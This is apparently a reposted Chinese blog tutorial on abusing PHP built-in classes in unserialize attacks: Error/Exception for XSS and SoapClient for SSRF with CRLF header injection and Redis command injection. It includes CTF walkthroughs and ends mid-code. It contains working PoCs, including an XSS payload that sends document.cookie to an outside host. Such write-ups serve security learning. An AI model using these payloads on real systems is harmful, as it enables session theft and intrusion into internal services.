    <content type="html"><![CDATA[<p>php原生类利用</p><p>转载 <a href="https://www.anquanke.com/post/id/238482" target="_blank" rel="noopener">https://www.anquanke.com/post/id/238482</a>     </p><a id="more"></a><p>遍历一下PHP的内置类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__toString'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'__get'</span>,</span><br><span class="line">            <span class="string">'__set'</span>,</span><br><span class="line">            <span class="string">'__isset'</span>,</span><br><span class="line">            <span class="string">'__unset'</span>,</span><br><span class="line">            <span class="string">'__invoke'</span>,</span><br><span class="line">            <span class="string">'__set_state'</span>    <span class="comment">// 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常遇到的几个 PHP 原生类有如下几个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><h1 id="使用-Error-Exception-内置类进行-XSS"><a href="#使用-Error-Exception-内置类进行-XSS" class="headerlink" title="使用 Error/Exception 内置类进行 XSS"></a>使用 Error/Exception 内置类进行 XSS</h1><h2 id="Error-内置类"><a href="#Error-内置类" class="headerlink" title="Error 内置类"></a>Error 内置类</h2><p>适用于php7版本<br>在开启报错的情况下<br>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code>的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code>的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo的时候）会触发__toString 方法，这是一种挖洞的新思路。   </p><p>下面演示如何使用 Error 内置类来构造 XSS。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）</p><p>给出POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h2><p>适用于php5、7版本<br>开启报错的情况下<br>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">'whoami'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给出POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>进入题目，首先通过git泄露拿到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure><p>仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。</p><p>由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$poc = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($poc));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224<span class="number">-48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>string%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="keyword">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>执行后，得到flag就在 cookie 中</p><h1 id="使用-SoapClient-类进行-SSRF"><a href="#使用-SoapClient-类进行-SSRF" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h1><h2 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p><p>类摘要如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> __construct ( string|<span class="keyword">null</span> $wsdl , <span class="keyword">array</span> $options = [] )</span><br><span class="line">    <span class="keyword">public</span> __call ( string $name , <span class="keyword">array</span> $args ) : mixed</span><br><span class="line">    <span class="keyword">public</span> __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = <span class="keyword">false</span> ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getCookies ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> __getFunctions ( ) : <span class="keyword">array</span>|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getLastRequest ( ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getLastRequestHeaders ( ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getLastResponse ( ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getLastResponseHeaders ( ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __getTypes ( ) : <span class="keyword">array</span>|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __setCookie ( string $name , string|<span class="keyword">null</span> $value = <span class="keyword">null</span> ) : void</span><br><span class="line">    <span class="keyword">public</span> __setLocation ( string $location = <span class="string">""</span> ) : string|<span class="keyword">null</span></span><br><span class="line">    <span class="keyword">public</span> __setSoapHeaders ( SoapHeader|<span class="keyword">array</span>|<span class="keyword">null</span> $headers = <span class="keyword">null</span> ) : bool</span><br><span class="line">    <span class="keyword">public</span> __soapCall ( string $name , <span class="keyword">array</span> $args , <span class="keyword">array</span>|<span class="keyword">null</span> $options = <span class="keyword">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="keyword">null</span> $inputHeaders = <span class="keyword">null</span> , <span class="keyword">array</span> &amp;$outputHeaders = <span class="keyword">null</span> ) : mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该内置类有一个 <code>__call</code>方法，当<code>__call</code>方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个<code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><p>该类的构造函数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed <span class="variable">$wsdl</span> [，array <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure><p>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。<br>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p><h2 id="使用-SoapClient-类进行-SSRF-1"><a href="#使用-SoapClient-类进行-SSRF-1" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h2><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span>=&gt;<span class="string">'http://xxx.xxx.xxx.xxx:3333/aaa'</span>, <span class="string">'uri'</span>=&gt;<span class="string">'http://xxx.xxx.xxx.xxx:3333'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先在xxx.xxx.xxx.xxx上面起个监听,然后执行上述代码，如下图所示成功触发SSRF，xxx.xxx.xxx.xxx上面收到了请求信息<br><img src="../../images/php/primary/1.png" alt=""></p><p>但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>如下测试代码，我们在HTTP头中插入一个cookie：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://xxx.xxx.xxx.xxx:3333/'</span>;</span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">"chrome\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4"</span>, <span class="string">'uri'</span> =&gt; <span class="string">'test'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：<br><img src="../../images/php/primary/2.png" alt=""></p><p>攻击redis  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1:3333/'</span>;</span><br><span class="line">$poc = <span class="string">"CONFIG SET dir /var/www/html"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'uri'</span> =&gt; <span class="string">'hello^^'</span>.$poc.<span class="string">'^^hello'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'^^'</span>,<span class="string">"\n\r"</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码后，如下图所示，成功插入了Redis命令：<br><img src="../../images/php/primary/3.png" alt=""></p><p>对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://xxx.xxx.xxx.xxx:2333/'</span>;</span><br><span class="line">$post_data = <span class="string">'data=whoami'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'</span></span><br><span class="line">);</span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'chrome^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>. (string)strlen($post_data).<span class="string">'^^^^'</span>.$post_data,<span class="string">'uri'</span>=&gt;<span class="string">'test'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(<span class="string">'^^'</span>,<span class="string">"\n\r"</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码后，如下图所示，成功发送POST数据：<br><img src="../../images/php/primary/4.png" alt=""></p><h2 id="bastphp’s-revenge"><a href="#bastphp’s-revenge" class="headerlink" title="bastphp’s revenge"></a>bastphp’s revenge</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。</p><p>但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。</p><p>写出最后的POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"chrome\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure><p>这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的session中。</p><p>然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 ini_set() 这个函数来更改 session.serialize_handler 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 session_start(serialize_handler=php_serialize) 就行了。我们可以利用题目中的 <code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现 session_start(serialize_handler=php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。</p><p>所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：</p><p><img src="../../images/php/primary/5.png" alt=""></p><p>此时，我们成功将我们php原生类SoapClient构造的payload传入了 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发<code>__call</code>方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br></pre></td></tr></table></figure><p>我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(call_user_func, array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;));</span><br></pre></td></tr></table></figure><p>call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。</p><p>这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 <code>__call</code>方法，造成ssrf去访问flag.php。</p><p>所以我们第二次传参如下：<br><img src="../../images/php/primary/6.png" alt=""><br>最后，我们第三次传参，用我们POC里面自己设置的cookie（PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4）去访问这个页面，<code>var_dump($_SESSION);</code> 会将 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的这个session内容输出出来，即可得到flag：<br><img src="../../images/php/primary/7.png" alt="">  </p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。<br>首先构造出session反序列化的条件:利用call_user_func()调用session_start()设置serialize_handler为php_serialize。<br>因为题目源码中没有可以利用的构造pop链的类，而刚好SOAP的SoapClient类可以用来创建soap数据报文，与wsdl接口进行交互的，达到ssrf的效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;'</span></span><br></pre></td></tr></table></figure><p>最后需要再利用第二个call_user_func激活soap类，具体实施是通过变量覆盖利用extract将$b为call_user_func，调用$a中对象，从而触发soap的网络请求。这里数组a中<code>$_SESSION</code>里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = array(<span 